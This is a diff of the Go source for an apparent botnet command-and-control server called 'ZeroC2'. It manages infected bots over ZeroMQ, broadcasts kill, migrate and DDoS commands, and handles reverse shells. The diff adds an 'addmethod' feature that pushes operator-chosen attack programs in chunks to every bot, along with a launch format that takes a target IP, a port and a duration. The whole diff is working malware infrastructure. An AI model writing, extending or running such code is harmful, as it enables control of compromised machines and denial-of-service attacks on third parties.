@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"regexp"
 	"strconv"
 	"strings"
 	"sync"
@@ -35,19 +36,53 @@ type Botstruc struct {
 	reversekey string
 }
 
-var (
-	connIDs     = make(map[string]string)
-	tera        = make(map[string]Botstruc)
-	aliveclient = make(map[string]time.Time)
-	shell       = false
-	start       = time.Now()
-	pubmutex    sync.Mutex
-	routmutex   sync.Mutex
+type Method struct {
+	name         string
+	path         string
+	flag_entries []methflag
+	rawformat    string
+}
+
+type methflag struct {
+	entry     string
+	entrytype string
+}
+
+type ParseType struct {
+	VarType string
+}
+
+const (
+	chunkSize = 1024 // Define the size of each file chunk
+	//you can change this value for faster method upload speed
 )
 
-func broadcaster(message, bot string, publisher *zmq.Socket) {
+func isValidType(t string) bool {
+	validTypes := map[string]bool{
+		"string": true,
+		"ip":     true,
+		"port":   true,
+		"int":    true,
+	}
+
+	return validTypes[t]
+}
+
+var (
+	//DONT change any of these
+	connIDs        = make(map[string]string)
+	tera           = make(map[string]Botstruc)
+	aliveclient    = make(map[string]time.Time)
+	custom_methods = make([]Method, 0)
+	shell          = false
+	start          = time.Now()
+	pubmutex       sync.Mutex
+	routmutex      sync.Mutex
+)
+
+func broadcaster(message []string, publisher *zmq.Socket) {
 	pubmutex.Lock()
-	publisher.Send(fmt.Sprintf("%s:%s", bot, message), 1)
+	publisher.SendMessage(message)
 	pubmutex.Unlock()
 }
 
@@ -64,7 +99,7 @@ func heartroutsend(router *zmq.Socket) {
 
 func heartpubsend(publisher *zmq.Socket) {
 	for {
-		broadcaster("h", "terylene", publisher)
+		broadcaster([]string{"terylene", "h"}, publisher)
 		time.Sleep(2 * time.Second)
 	}
 }
@@ -253,7 +288,7 @@ func IPC() {
 		}
 	}
 
-	log.Println("ZeroC2 Call has shutdown")
+	log.Println("ZeroC2 IPC Call has shutdown")
 }
 
 func randomtransfer(target string, rport, amount int, router, publisher *zmq.Socket) {
@@ -262,7 +297,7 @@ func randomtransfer(target string, rport, amount int, router, publisher *zmq.Soc
 		routmutex.Lock()
 		router.SendMessage(id, "migrate", target, rport)
 		routmutex.Unlock()
-		broadcaster("migrate", connIDs[id], publisher)
+		broadcaster([]string{connIDs[id], "migrate"}, publisher)
 		delete(aliveclient, id)
 		delete(tera, id)
 		delete(connIDs, id)
@@ -290,7 +325,7 @@ func killprompt(prompt string, router, publisher *zmq.Socket) string {
 }
 
 func killall(publisher *zmq.Socket) {
-	broadcaster("killall", "terylene", publisher)
+	broadcaster([]string{"terylene", "killall"}, publisher)
 	clearScreen()
 	fmt.Println(poly.Killallsuc)
 }
@@ -359,7 +394,7 @@ func transferprompt(prompt string, router, publisher *zmq.Socket) string {
 				routmutex.Lock()
 				router.SendMessage(zid, "migrate", target, rport)
 				routmutex.Unlock()
-				broadcaster("migrate", id, publisher)
+				broadcaster([]string{id, "migrate"}, publisher)
 				delete(aliveclient, zid)
 				delete(tera, zid)
 				delete(connIDs, zid)
@@ -440,6 +475,155 @@ func reversehandler(connID string, scanner *bufio.Scanner, router *zmq.Socket) {
 	}
 }
 
+func uploadmethod(meth Method, pub *zmq.Socket) {
+	filePath := meth.path
+
+	file, err := os.Open(filePath)
+	name := meth.name
+	fileInfo, err := os.Stat(filePath)
+
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	filename := fileInfo.Name()
+	if err != nil {
+		log.Printf("could not open file: %v\n", err)
+		return
+	}
+
+	defer file.Close()
+
+	reader := bufio.NewReader(file)
+	buffer := make([]byte, chunkSize)
+
+	pubmutex.Lock()
+	pub.SendMessage("terylene", "file_start", name, filename)
+	pubmutex.Unlock()
+
+	fmt.Println("upload...")
+	for {
+		bytesRead, err := reader.Read(buffer)
+		if err != nil {
+			if err == io.EOF {
+				break
+			}
+			log.Fatalf("could not read chunk from file: %v", err)
+		}
+		chunk := buffer[:bytesRead]
+
+		pubmutex.Lock()
+		pub.SendMessage("terylene", "file_chunk", name, chunk)
+		pubmutex.Unlock()
+	}
+
+	pubmutex.Lock()
+	pub.SendMessage("terylene", "file_end", name, meth.rawformat)
+	pubmutex.Unlock()
+
+	custom_methods = append(custom_methods, meth)
+	fmt.Println("upload finished")
+}
+
+func addmethod(method string, publisher *zmq.Socket) {
+	scanner := bufio.NewScanner(os.Stdin)
+
+	var meth Method
+
+	for _, custom := range config.Methods {
+		if custom == method {
+			color.Red("conflicting method name with builtin name: %s\n", custom)
+			return
+		}
+	}
+
+	meth.name = method
+
+	for {
+		fmt.Print("method path:")
+		scanner.Scan()
+		mpath := scanner.Text()
+
+		if mpath == "exit" {
+			return
+		}
+
+		_, err := os.Stat(mpath)
+
+		if err == nil {
+			meth.path = mpath
+			break
+		} else if os.IsNotExist(err) {
+			color.Red("No such file present")
+		} else {
+			log.Printf("fatal error: %s\n", err)
+			return
+		}
+	}
+
+	for {
+		ifmain := false
+		color.Green("input the format to execute this method (example: ./$main::string $target::ip $port::port $time::int)")
+		fmt.Print("format:")
+
+		scanner.Scan()
+		format := scanner.Text()
+
+		if format == "exit" {
+			return
+		}
+
+		var flags []methflag
+
+		pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
+		re := regexp.MustCompile(pattern)
+
+		matches := re.FindAllStringSubmatch(format, -1)
+
+		if len(matches) == 0 {
+			color.Red("there are no entry!!!")
+			continue
+		}
+
+		for _, match := range matches {
+			fmt.Println(match)
+			if match[1] == "main" {
+				ifmain = true
+			}
+
+			flags = append(flags, methflag{entry: match[1], entrytype: match[2]})
+
+		}
+
+		if ifmain == false {
+			color.Red("Format has no main argument")
+			continue
+		}
+
+		meth.rawformat = format
+		meth.flag_entries = flags
+
+		custom_methods = append(custom_methods, meth)
+
+		fmt.Println(meth)
+		break
+	}
+
+	color.Green("Name:%s\nMethod path:%s\nFormat:%s", meth.name, meth.path, meth.rawformat)
+	fmt.Print("Are the information above correct? [Y/N]")
+
+	scanner.Scan()
+	result := scanner.Text()
+
+	if strings.ToLower(result) == "y" {
+		uploadmethod(meth, publisher)
+	} else {
+		fmt.Println("aborting operation...")
+		return
+	}
+}
+
 func main() {
 	scanner := bufio.NewScanner(os.Stdin)
 
@@ -491,6 +675,16 @@ func main() {
 				continue
 			}
 			reversehandler(parts[1], scanner, router)
+		}
+
+		if strings.Contains(command, "addmethod") {
+			parts := strings.Fields(command)
+
+			if len(parts) != 2 {
+				color.Red(poly.AddmethodHelp)
+				continue
+			}
+			addmethod(parts[1], publisher)
 		}
 
 		switch command {
@@ -547,7 +741,7 @@ func main() {
 							if err != nil {
 								continue
 							}
-							broadcaster(command, "terylene", publisher)
+							broadcaster([]string{"terylene", command}, publisher)
 							clearScreen()
 							fmt.Println(poly.Ddosmsg)
 						} else {
